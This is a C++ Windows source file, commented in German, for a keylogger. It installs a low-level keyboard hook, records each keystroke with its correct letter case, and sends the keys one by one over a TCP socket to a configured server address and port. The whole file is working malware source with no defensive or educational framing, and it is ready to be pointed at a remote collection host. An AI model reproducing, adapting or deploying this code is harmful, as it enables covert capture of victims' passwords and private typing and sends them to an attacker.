#pragma comment(lib, "ws2_32.lib")
#include <iostream>
#include <string>
#include <cstdio>
#include <WinSock2.h>
#include <Windows.h>

#define C_CAPS_LOCK  20
#define C_SHIFT     -96
#define C_RETURN     13
#define C_AE        -34
#define C_OE        -64
#define C_UE        -70

using namespace std;

string serverip = "127.0.0.1";
const int serverport  = 12346;

char *sendbuf;

long rc;

WSADATA wsaData;
SOCKET sConnect;
sockaddr_in addr;


bool sendToServer(char* msg, const char* ip)
{
	rc = send(sConnect, sendbuf, strlen(sendbuf), 0);
	if(rc == SOCKET_ERROR)
	{
		cout << "could not send" << endl
             << "connection to server ( " << serverip << " ) lost" << endl;
        return false;
	}
	return true;
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT hook = (PKBDLLHOOKSTRUCT)lParam;

    if(wParam == WM_KEYDOWN)
    {
        if(hook->vkCode)
        {
            // Falls Zeichen nicht sichtbar sein soll
            bool noprint = false;

            // Groß- und Kleinschreibung (CAPS LOCK, SHIFT) behandeln
            char key = (char)hook->vkCode;
            if(GetKeyState(VK_CAPITAL) || GetAsyncKeyState(VK_SHIFT))   // bei GetKeyState(VK_SHIFT)
                key = toupper(key);                                     // hat es nicht richtig
            else                                                        // funktioniert
                key = tolower(key);

            // beim Drücken von CAPS LOCK kein Zeichen (key) ausgeben
            if(key == C_CAPS_LOCK || key == C_SHIFT)
                noprint = true;

            // bei Enter-Taste eine neue Zeile anfangen
            if(key == C_RETURN) key = '\n';

            if(!noprint)
            {
                sendbuf = new char[8];
                sprintf(sendbuf, "%c", key);
                sendToServer(sendbuf, serverip.c_str());

                delete[] sendbuf;
            }
        }
    }

    CallNextHookEx(NULL, nCode, wParam, lParam);
}



int main()
{
	WSAStartup(MAKEWORD(2, 0), &wsaData);
	sConnect = socket(AF_INET, SOCK_STREAM, 0);

	addr.sin_addr.s_addr = inet_addr(serverip.c_str());
	addr.sin_family      = AF_INET;
	addr.sin_port		 = htons((u_short)serverport);
	int addrlen = sizeof(addr);

	cout << "trying to connect to " << serverip << ":" << ntohs(addr.sin_port) << endl;
    while(1)
    {
        if(connect(sConnect, (struct sockaddr*)&addr, addrlen) != SOCKET_ERROR)
        {
            cout << "connected to "
                 << inet_ntoa(addr.sin_addr) << ":" << ntohs(addr.sin_port)
                 << endl;
            break;
        }
        cout << ".";
        Sleep(500);
    }

    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);

    MSG messages;
    while (GetMessage(&messages, NULL, 0, 0))
    {
    }

	closesocket(sConnect);
	WSACleanup();
	getchar();

	return 0;
}
